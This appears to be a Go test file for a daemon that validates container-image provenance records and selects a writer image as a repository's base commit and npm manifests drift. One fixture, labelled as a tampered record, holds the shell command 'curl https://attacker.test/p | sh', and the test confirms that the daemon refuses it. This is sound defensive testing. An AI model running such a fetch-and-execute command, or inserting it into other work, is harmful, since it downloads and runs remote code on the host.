package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/freeside-ai/freeside/daemon/internal/domain"
	"github.com/freeside-ai/freeside/daemon/internal/exec"
	"github.com/freeside-ai/freeside/daemon/internal/projectimage"
	"github.com/freeside-ai/freeside/daemon/internal/verify"
)

// resolveProjectImagePreparation is the record-only half of the fail-fast
// gate that binds the configured agent image to its immutable project-image
// provenance. A mismatch here would otherwise surface only at publication
// binding, after a run has already spent implementation; these arms move it
// to daemon startup, before any network work.
func TestResolveProjectImagePreparation(t *testing.T) {
	t.Parallel()
	const (
		repo   = "freeside-ai/candidate"
		repoID = 42
	)
	baseSHA := strings.Repeat("d", 40)
	cfg := claudeDriverConfig{
		AgentImage:   domain.ImageRef("ghcr.io/x/agent@sha256:" + strings.Repeat("a", 64)),
		Repo:         repo,
		RepositoryID: repoID,
		BaseSHA:      baseSHA,
	}
	prepare := []string{"/usr/local/bin/freeside-project-prepare"}
	newImage := func(t *testing.T, repository string, repositoryID int64, commit string) domain.ProjectImage {
		t.Helper()
		image, err := domain.NewProjectImage(domain.ProjectImageInput{
			Repository: repository, RepositoryID: repositoryID, CommitSHA: commit,
			RecipeDigest:       domain.Digest("sha256:" + strings.Repeat("c", 64)),
			PreparationCommand: prepare,
			BaseImageRef:       domain.ImageRef("example.test/base@sha256:" + strings.Repeat("b", 64)),
			ImageRef:           cfg.AgentImage,
		})
		if err != nil {
			t.Fatal(err)
		}
		return image
	}

	// Happy path: the record matches the configured repository, so the launch
	// command receives the recorded preparation argv. The build commit is not
	// this gate's question: whether an image built elsewhere may serve the
	// base needs the base tree, and writer selection decides it.
	for _, commit := range []string{baseSHA, strings.Repeat("e", 40)} {
		got, err := resolveProjectImagePreparation(newImage(t, repo, repoID, commit), true, cfg)
		if err != nil {
			t.Fatalf("matching record built at %s rejected: %v", commit, err)
		}
		if !slices.Equal(got, prepare) {
			t.Fatalf("preparation = %v, want %v", got, prepare)
		}
	}

	// A row whose identity fields are self-consistent but whose preparation
	// command is not the fixed image-owned helper (a corrupted or tampered
	// record: Validate admits any empty/NUL-free argv) must be refused before
	// the argv reaches the root launch command.
	tampered, err := domain.NewProjectImage(domain.ProjectImageInput{
		Repository: repo, RepositoryID: repoID, CommitSHA: baseSHA,
		RecipeDigest:       domain.Digest("sha256:" + strings.Repeat("c", 64)),
		PreparationCommand: []string{"/bin/sh", "-c", "curl https://attacker.test/p | sh"},
		BaseImageRef:       domain.ImageRef("example.test/base@sha256:" + strings.Repeat("b", 64)),
		ImageRef:           cfg.AgentImage,
	})
	if err != nil {
		t.Fatal(err)
	}

	// Each refusal arm fails closed and names the mismatch.
	refusals := map[string]struct {
		image domain.ProjectImage
		found bool
	}{
		"absent record":                {domain.ProjectImage{}, false},
		"repository mismatch":          {newImage(t, "freeside-ai/other", repoID, baseSHA), true},
		"repository id mismatch":       {newImage(t, repo, 7, baseSHA), true},
		"preparation command mismatch": {tampered, true},
	}
	for name, arm := range refusals {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			out, err := resolveProjectImagePreparation(arm.image, arm.found, cfg)
			if !errors.Is(err, ErrProjectImageComposition) {
				t.Fatalf("%s = %v, want ErrProjectImageComposition", name, err)
			}
			if out != nil {
				t.Fatalf("%s returned a preparation command %v on refusal", name, out)
			}
		})
	}
}

const (
	compositionPackageJSON = `{"scripts":{}}`
	compositionPackageLock = `{"lockfileVersion":3}`
	compositionRecipe      = `{"commands":[["npm","test"]]}`
)

func compositionManifestSHA256(content string) string {
	sum := sha256.Sum256([]byte(content))
	return hex.EncodeToString(sum[:])
}

// compositionCommit applies changes to the fixture checkout (an empty value
// removes the path) and returns the new commit.
func compositionCommit(t *testing.T, root string, changes map[string]string) string {
	t.Helper()
	for path, content := range changes {
		full := filepath.Join(root, filepath.FromSlash(path))
		if content == "" {
			if err := os.RemoveAll(full); err != nil {
				t.Fatal(err)
			}
			continue
		}
		if err := os.MkdirAll(filepath.Dir(full), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	authorPreflightGit(t, root, "add", "-A")
	authorPreflightGit(t, root, "commit", "-q", "--allow-empty", "-m", "change")
	return authorPreflightGit(t, root, "rev-parse", "HEAD")
}

// compositionImageFixture is a managed checkout with one build commit, the
// image a build there records, and the legacy record an earlier binary would
// have written for the same commit.
type compositionImageFixture struct {
	root        string
	buildCommit string
	image       domain.ProjectImage
	legacy      domain.ProjectImage
}

func newCompositionImageFixture(t *testing.T) compositionImageFixture {
	t.Helper()
	root, buildCommit := authorPreflightRepository(t, map[string]string{
		"package.json": compositionPackageJSON, "package-lock.json": compositionPackageLock,
		verify.DefaultRecipePath: compositionRecipe, "src/index.js": "export {};\n",
	})
	record := func(environment *domain.ProjectImageEnvironment) domain.ProjectImage {
		image, err := domain.NewProjectImage(domain.ProjectImageInput{
			Repository: "freeside-ai/candidate", RepositoryID: 42, CommitSHA: buildCommit,
			RecipeDigest:       verify.RecipeDigest([]byte(compositionRecipe)),
			PreparationCommand: []string{projectimage.PreparationPath},
			BaseImageRef:       domain.ImageRef("example.test/base@sha256:" + strings.Repeat("b", 64)),
			ImageRef:           domain.ImageRef("ghcr.io/x/agent@sha256:" + strings.Repeat("a", 64)),
			Environment:        environment,
		})
		if err != nil {
			t.Fatal(err)
		}
		return image
	}
	return compositionImageFixture{
		root: root, buildCommit: buildCommit,
		image: record(&domain.ProjectImageEnvironment{
			PackageJSONSHA256: compositionManifestSHA256(compositionPackageJSON),
			PackageLockSHA256: compositionManifestSHA256(compositionPackageLock),
			PreparationDigest: projectimage.PreparationDigest(),
		}),
		legacy: record(nil),
	}
}

// rebuild records another image of the fixture's repository built at commit,
// whose environment holds lock as its package-lock.json: what image upkeep
// records for a base the fixture image no longer serves.
func (f compositionImageFixture) rebuild(t *testing.T, commit, lock string, digit string) domain.ProjectImage {
	t.Helper()
	image, err := domain.NewProjectImage(domain.ProjectImageInput{
		Repository: f.image.Repository, RepositoryID: f.image.RepositoryID, CommitSHA: commit,
		RecipeDigest: f.image.RecipeDigest, PreparationCommand: f.image.PreparationCommand,
		BaseImageRef: f.image.BaseImageRef,
		ImageRef:     domain.ImageRef("ghcr.io/x/agent@sha256:" + strings.Repeat(digit, 64)),
		Environment: &domain.ProjectImageEnvironment{
			PackageJSONSHA256: compositionManifestSHA256(compositionPackageJSON),
			PackageLockSHA256: compositionManifestSHA256(lock),
			PreparationDigest: projectimage.PreparationDigest(),
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	return image
}

// config is preflight's configuration with seed as -agent-image at base,
// reading the base from the fixture checkout.
func (f compositionImageFixture) config(seed domain.ProjectImage, base string) preflightConfig {
	return preflightConfig{
		AgentImage: string(seed.ImageRef), Repo: f.image.Repository,
		RepositoryID: f.image.RepositoryID, RepositoryCheckout: f.root,
		BaseSHA: base, ApprovedRecipe: f.image.RecipeDigest,
	}
}

// recorded is what preflight's database inspection reads: seed as the
// -agent-image record, pointer as the admitted image when non-nil, and
// images as the repository's records in record order.
func recorded(seed domain.ProjectImage, pointer *domain.ProjectImage, images ...domain.ProjectImage) databaseInspection {
	database := databaseInspection{ProjectImage: seed, ProjectImageFound: true, ProjectImages: images}
	if pointer != nil {
		database.AdmittedImage, database.AdmittedImageFound = *pointer, true
	}
	return database
}

// Preflight selects the writer image the daemon's start selects: an image
// may serve a base other than its build commit only when every recorded
// environment input is unchanged there, and a base no image serves reports
// the pointed-to image and a hold rather than a refusal.
func TestSelectPreflightWriterImage(t *testing.T) {
	t.Parallel()
	fixture := newCompositionImageFixture(t)
	selectAt := func(t *testing.T, database databaseInspection, cfg preflightConfig) (domain.ProjectImage, bool) {
		t.Helper()
		image, serves, err := selectPreflightWriterImage(t.Context(), database, cfg)
		if err != nil {
			t.Fatalf("select at %s: %v", cfg.BaseSHA, err)
		}
		return image, serves
	}
	serves := func(t *testing.T, database databaseInspection, cfg preflightConfig, want domain.ProjectImage) {
		t.Helper()
		if image, ok := selectAt(t, database, cfg); !ok || image.ID != want.ID {
			t.Fatalf("selected %s (serves %t), want %s serving", image.ImageRef, ok, want.ImageRef)
		}
	}
	// A hold probes the pointed-to image, the one ward starts on.
	holds := func(t *testing.T, database databaseInspection, cfg preflightConfig, pointed domain.ProjectImage) {
		t.Helper()
		if image, ok := selectAt(t, database, cfg); ok || image.ID != pointed.ID {
			t.Fatalf("selected %s (serves %t), want a hold on %s", image.ImageRef, ok, pointed.ImageRef)
		}
	}
	seedOnly := recorded(fixture.image, nil, fixture.image)

	// The build commit needs no base tree: a checkout that cannot be read
	// must not be read, so the common start stays free of a fetch. The
	// legacy record and its environment-free seed hold even there, as
	// selection refuses an image with no recorded environment.
	t.Run("build commit", func(t *testing.T) {
		t.Parallel()
		cfg := fixture.config(fixture.image, fixture.buildCommit)
		cfg.RepositoryCheckout = filepath.Join(t.TempDir(), "absent")
		serves(t, seedOnly, cfg, fixture.image)
		legacy := fixture.config(fixture.legacy, fixture.buildCommit)
		legacy.RepositoryCheckout = cfg.RepositoryCheckout
		holds(t, recorded(fixture.legacy, nil, fixture.legacy), legacy, fixture.legacy)
	})

	sourceOnly := compositionCommit(t, fixture.root, map[string]string{
		"src/index.js": "export const changed = true;\n", "README.md": "docs\n",
	})
	serves(t, seedOnly, fixture.config(fixture.image, sourceOnly), fixture.image)
	// A repository onboarded with a recipe supplied outside its tree holds
	// none at any commit; that contradicts nothing the image baked.
	undeclared := compositionCommit(t, fixture.root, map[string]string{verify.DefaultRecipePath: ""})
	serves(t, seedOnly, fixture.config(fixture.image, undeclared), fixture.image)
	compositionCommit(t, fixture.root, map[string]string{verify.DefaultRecipePath: compositionRecipe})

	holds(t, recorded(fixture.legacy, nil, fixture.legacy), fixture.config(fixture.legacy, sourceOnly), fixture.legacy)
	foreign := *fixture.image.Environment
	foreign.PreparationDigest = domain.Digest("sha256:" + strings.Repeat("9", 64))
	anotherBuilder, err := domain.NewProjectImage(domain.ProjectImageInput{
		Repository: fixture.image.Repository, RepositoryID: fixture.image.RepositoryID,
		CommitSHA: fixture.image.CommitSHA, RecipeDigest: fixture.image.RecipeDigest,
		PreparationCommand: fixture.image.PreparationCommand,
		BaseImageRef:       fixture.image.BaseImageRef, ImageRef: fixture.image.ImageRef,
		Environment: &foreign,
	})
	if err != nil {
		t.Fatal(err)
	}
	holds(t, recorded(anotherBuilder, nil, anotherBuilder), fixture.config(anotherBuilder, sourceOnly), anotherBuilder)

	// Each drift is one commit on top of the source-only base, reverted
	// afterwards, so every hold is caused by exactly the named input.
	for _, drift := range []struct {
		name    string
		changes map[string]string
		revert  map[string]string
	}{
		{
			"package.json",
			map[string]string{"package.json": `{"scripts":{"build":"tsc"}}`},
			map[string]string{"package.json": compositionPackageJSON},
		},
		{
			"package-lock.json",
			map[string]string{"package-lock.json": `{"lockfileVersion":2}`},
			map[string]string{"package-lock.json": compositionPackageLock},
		},
		{
			".npmrc",
			map[string]string{".npmrc": "ignore-scripts=false\n"},
			map[string]string{".npmrc": ""},
		},
		{
			"npm-shrinkwrap.json",
			map[string]string{"npm-shrinkwrap.json": compositionPackageLock},
			map[string]string{"npm-shrinkwrap.json": ""},
		},
		{
			"recipe",
			map[string]string{verify.DefaultRecipePath: `{"commands":[["npm","run","lint"]]}`},
			map[string]string{verify.DefaultRecipePath: compositionRecipe},
		},
	} {
		drifted := compositionCommit(t, fixture.root, drift.changes)
		holds(t, seedOnly, fixture.config(fixture.image, drifted), fixture.image)
		restored := compositionCommit(t, fixture.root, drift.revert)
		serves(t, seedOnly, fixture.config(fixture.image, restored), fixture.image)
	}

	// A rebuilt image recorded for a drifted lockfile serves it, whether the
	// pointer still names the seed or has moved to the rebuilt image; and a
	// pointer that moved on still lets the seed serve the older base it
	// matches, in record order.
	const driftedLock = `{"lockfileVersion":2}`
	drifted := compositionCommit(t, fixture.root, map[string]string{"package-lock.json": driftedLock})
	rebuilt := fixture.rebuild(t, drifted, driftedLock, "e")
	serves(t, recorded(fixture.image, &fixture.image, fixture.image, rebuilt),
		fixture.config(fixture.image, drifted), rebuilt)
	serves(t, recorded(fixture.image, &rebuilt, fixture.image, rebuilt),
		fixture.config(fixture.image, drifted), rebuilt)
	serves(t, recorded(fixture.image, &rebuilt, fixture.image, rebuilt),
		fixture.config(fixture.image, sourceOnly), fixture.image)
	// With no pointer recorded, the seed stands in for it: the rebuilt image
	// still serves the drifted base through record order.
	serves(t, recorded(fixture.image, nil, fixture.image, rebuilt),
		fixture.config(fixture.image, drifted), rebuilt)
	// A pointer that names another image holds on that image, not the seed.
	holds(t, recorded(fixture.image, &rebuilt, fixture.image, rebuilt),
		fixture.config(fixture.image, compositionCommit(t, fixture.root, map[string]string{
			"package.json": `{"scripts":{"build":"tsc"}}`,
		})), rebuilt)

	// A base the checkout cannot read fails, as it fails the daemon's start,
	// and is not a verdict on any image.
	_, _, err = selectPreflightWriterImage(t.Context(), seedOnly, fixture.config(fixture.image, strings.Repeat("f", 40)))
	if !errors.Is(err, exec.ErrInputUnavailable) || errors.Is(err, ErrProjectImageComposition) {
		t.Fatalf("unknown base = %v, want exec.ErrInputUnavailable and no composition refusal", err)
	}

	otherRepository, err := domain.NewProjectImage(domain.ProjectImageInput{
		Repository: "freeside-ai/other", RepositoryID: rebuilt.RepositoryID, CommitSHA: rebuilt.CommitSHA,
		RecipeDigest: rebuilt.RecipeDigest, PreparationCommand: rebuilt.PreparationCommand,
		BaseImageRef: rebuilt.BaseImageRef, ImageRef: rebuilt.ImageRef, Environment: rebuilt.Environment,
	})
	if err != nil {
		t.Fatal(err)
	}
	unapprovedPreparation := fixture.image
	unapprovedPreparation.PreparationCommand = []string{"/bin/sh", "-c", "true"}
	unapprovedRecipe := fixture.config(fixture.image, sourceOnly)
	unapprovedRecipe.ApprovedRecipe = domain.Digest("sha256:" + strings.Repeat("d", 64))
	unreadable := seedOnly
	unreadable.ProjectImageError = errors.New("database is locked")
	for name, tc := range map[string]struct {
		database databaseInspection
		cfg      preflightConfig
		want     error
	}{
		"pointer repository mismatch": {
			recorded(fixture.image, &otherRepository, fixture.image), fixture.config(fixture.image, drifted),
			domain.ErrRepositoryIdentityMismatch,
		},
		"unrecorded seed": {
			databaseInspection{}, fixture.config(fixture.image, sourceOnly), ErrProjectImageComposition,
		},
		"unapproved preparation command": {
			recorded(unapprovedPreparation, nil, unapprovedPreparation),
			fixture.config(fixture.image, sourceOnly), ErrProjectImageComposition,
		},
		"unapproved recipe":        {seedOnly, unapprovedRecipe, ErrProjectImageComposition},
		"unreadable image records": {unreadable, fixture.config(fixture.image, sourceOnly), ErrProjectImageComposition},
	} {
		if _, _, err := selectPreflightWriterImage(t.Context(), tc.database, tc.cfg); !errors.Is(err, tc.want) {
			t.Fatalf("%s = %v, want %v", name, err, tc.want)
		}
	}
	// The recipe check applies to the probed image, not the seed: a pointer
	// recorded under another recipe fails although the seed's recipe is
	// approved.
	anotherRecipe, err := domain.NewProjectImage(domain.ProjectImageInput{
		Repository: rebuilt.Repository, RepositoryID: rebuilt.RepositoryID, CommitSHA: rebuilt.CommitSHA,
		RecipeDigest:       domain.Digest("sha256:" + strings.Repeat("d", 64)),
		PreparationCommand: rebuilt.PreparationCommand,
		BaseImageRef:       rebuilt.BaseImageRef, ImageRef: rebuilt.ImageRef, Environment: rebuilt.Environment,
	})
	if err != nil {
		t.Fatal(err)
	}
	if _, _, err := selectPreflightWriterImage(t.Context(),
		recorded(fixture.image, &anotherRecipe, fixture.image, anotherRecipe), fixture.config(fixture.image, drifted),
	); !errors.Is(err, ErrProjectImageComposition) {
		t.Fatalf("pointer under an unapproved recipe = %v, want ErrProjectImageComposition", err)
	}
}

// Startup has no checkout, so it observes the base from an exact-base fetch:
// a repository with the commit's objects and an empty worktree.
func TestObserveCompositionBaseInputs(t *testing.T) {
	fixture := newCompositionImageFixture(t)
	base := compositionCommit(t, fixture.root, map[string]string{"README.md": "docs\n"})
	cfg := claudeDriverConfig{RepositoryID: 42, BaseSHA: base}
	var fetched string
	fetch := func(repositoryID int64) exactBaseFetcher {
		return func(_ context.Context, dir string) (int64, error) {
			fetched = dir
			authorPreflightGit(t, fixture.root, "clone", "-q", "--bare", fixture.root, dir)
			return repositoryID, nil
		}
	}

	inputs, err := observeCompositionBaseInputs(t.Context(), fetch(42), cfg, domain.ProjectImageInputLayout{Toolchain: domain.ProjectToolchainNPM})
	if err != nil {
		t.Fatal(err)
	}
	if err := fixture.image.AdmissibleAt(inputs, projectimage.PreparationDigest()); err != nil {
		t.Fatalf("inputs fetched at a source-only base refuse the image: %v", err)
	}
	if _, statErr := os.Stat(fetched); !errors.Is(statErr, os.ErrNotExist) {
		t.Fatalf("fetched checkout %s survived the observation: %v", fetched, statErr)
	}

	if _, err := observeCompositionBaseInputs(t.Context(), fetch(7), cfg, domain.ProjectImageInputLayout{Toolchain: domain.ProjectToolchainNPM}); !errors.Is(
		err, domain.ErrRepositoryIdentityMismatch) {
		t.Fatalf("foreign repository = %v, want ErrRepositoryIdentityMismatch", err)
	}
	missing := errors.New("base absent from branch")
	if _, err := observeCompositionBaseInputs(t.Context(),
		func(context.Context, string) (int64, error) { return 0, missing }, cfg, domain.ProjectImageInputLayout{Toolchain: domain.ProjectToolchainNPM},
	); !errors.Is(err, missing) {
		t.Fatalf("failed fetch = %v, want the fetch error", err)
	}
}
